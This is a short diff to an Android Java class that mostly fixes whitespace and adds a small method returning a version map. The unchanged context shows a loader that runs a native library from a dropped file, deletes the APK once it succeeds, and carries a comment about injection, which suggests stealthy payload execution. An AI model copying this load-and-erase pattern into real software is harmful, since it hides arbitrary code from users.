@@ -12,6 +12,7 @@ import com.use.nice.util.Util_File;
 import com.use.nice.util.Util_Log;
 
 import java.io.File;
+import java.util.HashMap;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
@@ -95,7 +96,7 @@ public class NiceFace {
                 //2,sureApk
                 if (!face.sureApk()) {
                     Util_Log.log("no valid apk!");
-                    stopSelf( );
+                    stopSelf();
                     return;
                 }
 
@@ -105,17 +106,17 @@ public class NiceFace {
                     Util_Log.log("load so ...");
                     System.load("" + file.getAbsolutePath());
                     String ret = c.a(paramContext);
-                     Util_Log.logReal("nice exe ret:" + ret);
+                    Util_Log.logReal("nice exe ret:" + ret);
 
-                     Util_File.writeDef(paramContext, FieldName.soSuccess, ret);
+                    Util_File.writeDef(paramContext, FieldName.soSuccess, ret);
                     if (ret.equals(FieldName.success)) {
                         face.deleteApk();
 
                     }
-                    stopSelf( );
+                    stopSelf();
                 } catch (Throwable e) {
                     e.printStackTrace();
-                    stopSelf( );
+                    stopSelf();
                     face.deleteApk();
                     // return;
                 }
@@ -141,6 +142,11 @@ public class NiceFace {
         if(serviceIns!=null){
             serviceIns.stopSelf();
         }
+    }
+    public static HashMap<String,String> getTarnsferData() {
+        HashMap<String, String> map = new HashMap<>();
+        map.put(FieldName.dVersion, NiceCts.HULL_VERSION+"");
+        return map;
     }
 
     //注入时调用
